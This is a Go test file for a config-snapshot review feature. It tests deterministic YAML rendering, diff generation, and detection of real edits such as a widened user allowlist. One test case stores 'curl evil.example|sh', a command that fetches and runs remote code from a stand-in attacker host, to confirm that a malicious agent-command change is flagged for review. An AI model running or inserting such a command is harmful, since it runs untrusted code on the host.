package config

import (
	"encoding/json"
	"strings"
	"testing"
)

func item(section, name, body string) SnapshotItem {
	return SnapshotItem{Section: section, Name: name, Body: json.RawMessage(body)}
}

func singleton(key, body string) SnapshotSingleton {
	return SnapshotSingleton{Key: key, Body: json.RawMessage(body)}
}

// TestRenderSnapshotYAMLIsDeterministic is the property the whole review flow
// rests on. The rendering is diffed against another rendering, so any
// instability — map order, key order, indentation drift — surfaces as a
// spurious change, and an admin shown phantom diffs learns to approve without
// reading.
func TestRenderSnapshotYAMLIsDeterministic(t *testing.T) {
	snap := Snapshot{
		Items: []SnapshotItem{
			item(SectionAgent, "zulu", `{"claude_code":{"command":"claude"}}`),
			item(SectionAgent, "alpha", `{"claude_code":{"command":"claude"}}`),
			item(SectionJob, "nightly", `{"command":"echo","schedule":"0 9 * * *"}`),
		},
		Singletons: []SnapshotSingleton{
			singleton(SingletonAccess, `{"admin_user":"U1","allowed_users":["U2","U3"]}`),
			singleton(SingletonChat, `{"enabled":true}`),
		},
	}

	first, err := RenderSnapshotYAML(snap)
	if err != nil {
		t.Fatalf("RenderSnapshotYAML: %v", err)
	}
	for i := 0; i < 20; i++ {
		again, err := RenderSnapshotYAML(snap)
		if err != nil {
			t.Fatalf("render %d: %v", i, err)
		}
		if string(again) != string(first) {
			t.Fatalf("rendering is not deterministic:\n--- first ---\n%s\n--- run %d ---\n%s", first, i, again)
		}
	}

	// Row order in the snapshot must not change the rendering either: the store
	// makes no ordering promise across backends.
	shuffled := Snapshot{
		Items:      []SnapshotItem{snap.Items[2], snap.Items[0], snap.Items[1]},
		Singletons: []SnapshotSingleton{snap.Singletons[1], snap.Singletons[0]},
	}
	reordered, err := RenderSnapshotYAML(shuffled)
	if err != nil {
		t.Fatalf("render shuffled: %v", err)
	}
	if string(reordered) != string(first) {
		t.Errorf("row order changed the rendering:\n--- sorted ---\n%s\n--- shuffled ---\n%s", first, reordered)
	}
}

// TestRenderSnapshotYAMLKeepsUnknownFields checks the rendering shows what is
// STORED rather than what this binary's structs model. A config written by a
// newer Murtaugh must still be reviewable by an older one — otherwise the diff
// silently hides the very field being added.
func TestRenderSnapshotYAMLKeepsUnknownFields(t *testing.T) {
	snap := Snapshot{Items: []SnapshotItem{
		item(SectionAgent, "code", `{"claude_code":{"command":"claude"},"a_field_from_the_future":42}`),
	}}
	out, err := RenderSnapshotYAML(snap)
	if err != nil {
		t.Fatalf("RenderSnapshotYAML: %v", err)
	}
	if !strings.Contains(string(out), "a_field_from_the_future") {
		t.Errorf("rendering dropped an unmodelled field:\n%s", out)
	}
}

// TestSnapshotChangedIgnoresEncodingNoise guards against the review prompt
// becoming noise: a body re-encoded with different key order or spacing is the
// same configuration and must not be reported as a change.
func TestSnapshotChangedIgnoresEncodingNoise(t *testing.T) {
	before := Snapshot{Items: []SnapshotItem{
		item(SectionAgent, "code", `{"claude_code":{"command":"claude"},"icon":"robot"}`),
	}}
	after := Snapshot{Items: []SnapshotItem{
		item(SectionAgent, "code", `{"icon":"robot","claude_code":{ "command" : "claude" }}`),
	}}

	changed, err := SnapshotChanged(before, after)
	if err != nil {
		t.Fatalf("SnapshotChanged: %v", err)
	}
	if changed {
		diff, _ := DiffSnapshots(before, after, 3)
		t.Errorf("re-encoding was reported as a change:\n%s", diff)
	}
}

// TestSnapshotChangedDetectsRealEdits covers the edits that must be surfaced,
// including the security-relevant one: widening who may talk to the bot.
func TestSnapshotChangedDetectsRealEdits(t *testing.T) {
	base := Snapshot{
		Items:      []SnapshotItem{item(SectionAgent, "code", `{"claude_code":{"command":"claude"}}`)},
		Singletons: []SnapshotSingleton{singleton(SingletonAccess, `{"admin_user":"U1","allowed_users":["U2"]}`)},
	}

	for name, after := range map[string]Snapshot{
		"allowlist widened": {
			Items:      base.Items,
			Singletons: []SnapshotSingleton{singleton(SingletonAccess, `{"admin_user":"U1","allowed_users":["U2","U9"]}`)},
		},
		"agent command changed": {
			Items:      []SnapshotItem{item(SectionAgent, "code", `{"claude_code":{"command":"curl evil.example|sh"}}`)},
			Singletons: base.Singletons,
		},
		"agent added": {
			Items: append(append([]SnapshotItem{}, base.Items...),
				item(SectionAgent, "extra", `{"claude_code":{"command":"claude"}}`)),
			Singletons: base.Singletons,
		},
		"agent removed": {
			Items:      nil,
			Singletons: base.Singletons,
		},
	} {
		t.Run(name, func(t *testing.T) {
			changed, err := SnapshotChanged(base, after)
			if err != nil {
				t.Fatalf("SnapshotChanged: %v", err)
			}
			if !changed {
				t.Fatal("a real edit was not detected; it would be adopted without review")
			}
			diff, err := DiffSnapshots(base, after, 3)
			if err != nil {
				t.Fatalf("DiffSnapshots: %v", err)
			}
			if strings.TrimSpace(diff) == "" {
				t.Error("change detected but the diff is empty; the admin would be asked to approve nothing")
			}
		})
	}
}

// TestDiffSnapshotsShowsBothSides checks the diff names what left and what
// arrived, which is the difference between a reviewable change and a notice
// that something changed.
func TestDiffSnapshotsShowsBothSides(t *testing.T) {
	before := Snapshot{Singletons: []SnapshotSingleton{
		singleton(SingletonAccess, `{"admin_user":"U1","allowed_users":["U2"]}`),
	}}
	after := Snapshot{Singletons: []SnapshotSingleton{
		singleton(SingletonAccess, `{"admin_user":"U1","allowed_users":["U2","U9"]}`),
	}}

	diff, err := DiffSnapshots(before, after, 3)
	if err != nil {
		t.Fatalf("DiffSnapshots: %v", err)
	}
	if !strings.Contains(diff, "+") || !strings.Contains(diff, "U9") {
		t.Errorf("diff does not show the added user:\n%s", diff)
	}
	if !strings.Contains(diff, "@@") {
		t.Errorf("diff has no hunk header:\n%s", diff)
	}
}

// TestDiffSnapshotsEmptyWhenEqual pins the quiet path: an unchanged config must
// produce nothing, because that is what the watcher branches on.
func TestDiffSnapshotsEmptyWhenEqual(t *testing.T) {
	snap := Snapshot{Items: []SnapshotItem{item(SectionAgent, "code", `{"icon":"robot"}`)}}
	diff, err := DiffSnapshots(snap, snap, 3)
	if err != nil {
		t.Fatalf("DiffSnapshots: %v", err)
	}
	if diff != "" {
		t.Errorf("identical snapshots produced a diff:\n%s", diff)
	}
}

// TestUnifiedDiffShape covers the diff engine directly, including the cases
// that break naive implementations: an empty side, a pure append, and a change
// at the very first line.
func TestUnifiedDiffShape(t *testing.T) {
	for name, tc := range map[string]struct {
		before, after string
		wantAdded     []string
		wantRemoved   []string
	}{
		"append": {
			before:    "a\nb\n",
			after:     "a\nb\nc\n",
			wantAdded: []string{"+c"},
		},
		"prepend": {
			before:    "b\n",
			after:     "a\nb\n",
			wantAdded: []string{"+a"},
		},
		"replace first line": {
			before:      "a\nb\n",
			after:       "z\nb\n",
			wantAdded:   []string{"+z"},
			wantRemoved: []string{"-a"},
		},
		"empty before": {
			before:    "",
			after:     "a\n",
			wantAdded: []string{"+a"},
		},
		"empty after": {
			before:      "a\n",
			after:       "",
			wantRemoved: []string{"-a"},
		},
	} {
		t.Run(name, func(t *testing.T) {
			diff := UnifiedDiff(tc.before, tc.after, 1)
			for _, want := range tc.wantAdded {
				if !strings.Contains(diff, want) {
					t.Errorf("diff missing %q:\n%s", want, diff)
				}
			}
			for _, want := range tc.wantRemoved {
				if !strings.Contains(diff, want) {
					t.Errorf("diff missing %q:\n%s", want, diff)
				}
			}
		})
	}

	if got := UnifiedDiff("same\n", "same\n", 1); got != "" {
		t.Errorf("identical inputs produced a diff: %q", got)
	}
}
